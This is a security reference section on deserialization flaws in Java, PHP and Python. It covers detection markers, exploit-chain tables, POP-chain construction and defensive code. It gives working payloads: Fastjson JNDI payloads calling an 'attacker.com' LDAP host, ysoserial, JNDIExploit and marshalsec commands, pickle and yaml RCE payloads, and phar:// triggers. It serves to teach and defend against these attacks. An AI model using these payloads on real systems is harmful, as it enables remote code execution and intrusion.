# Web Security - Deserialization Vulnerabilities

> Source: WooYun vulnerability database | split from web-injection.md

## 5. Deserialization Flaws

### 5.1 Nature of the Vulnerability

```
serialized data (untrusted) -> deserialization function -> object reconstruction triggers magic methods/callbacks -> malicious logic runs
```

**Core formula**: deserialization RCE = controllable serialized input + a dangerous class on the classpath/in scope + a reachable gadget chain

### 5.2 Java Deserialization

**Detection indicators**

```
Binary stream: AC ED 00 05 (hex header)
Base64:   rO0AB (encoded header)
Common locations: cookie, ViewState, JMX, RMI, T3 protocol, HTTP body
```

**Exploit-chain quick-reference**

| Exploit chain | Dependency | Trigger | Tool |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | Manual / dedicated tools |
| Jackson | jackson-databind | Polymorphic deserialization | ysoserial |
| JNDI injection | JDK < 8u191 | LDAP/RMI remote class loading | JNDIExploit/marshalsec |

**Classic Fastjson payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 cache bypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Tool chain**

```bash
# ysoserial generates the payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI injection service
java -jar JNDIExploit.jar -i attacker_ip

# marshalsec starts a malicious LDAP/RMI server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP Deserialization

**Detection indicators**

```
Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Key functions: unserialize(), phar://-wrapper trigger
```

**Magic-method exploit chain**

| Method | Trigger timing | Exploitation |
|------|----------|----------|
| `__wakeup()` | On the unserialize() call | Property overwrite -> dangerous operation |
| `__destruct()` | On object destruction | File delete/write / command execution |
| `__toString()` | When the object is used as a string | Concatenated into a dangerous function |
| `__call()` | Calling a non-existent method | A chaining pivot |

**POP-chain construction approach**

```
1. Find the entry: a method in __wakeup()/__destruct() that calls a $this->xxx property
2. Pivot: chain to other classes via __toString()/__call()/__get()
3. Endpoint: reach a dangerous function like system()/eval()/file_put_contents()
4. Construct: control property values so the chain connects end to end
```

**Phar deserialization (no unserialize call needed)**

```php
// file-operation functions trigger phar:// deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // disguised with an image extension
```

### 5.4 Python Deserialization

**Dangerous functions**

```python
import pickle, yaml, marshal

# pickle - most common
pickle.loads(data)      # deserialize
pickle.load(file)       # deserialize from a file

# yaml - needs a Loader
yaml.load(data)         # unsafe by default (old versions)
yaml.load(data, Loader=yaml.FullLoader)  # restricted loading

# marshal - bytecode level
marshal.loads(data)     # load a code object
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# equivalent manual construction:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Defenses

```java
// Java: ObjectInputStream allowlist filtering
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: upgrade components (Fastjson/Jackson/Commons-Collections), disable autoType, use an allowlist deserialization filter
- **PHP**: avoid unserialize() on user input, use json_decode instead, disable the phar:// wrapper
- **Python**: use `yaml.safe_load()` instead of `yaml.load()`, never pickle untrusted data, use JSON
- **General**: avoid native serialization formats for data transport, standardize on JSON; HMAC/sign the deserialization entry point

---

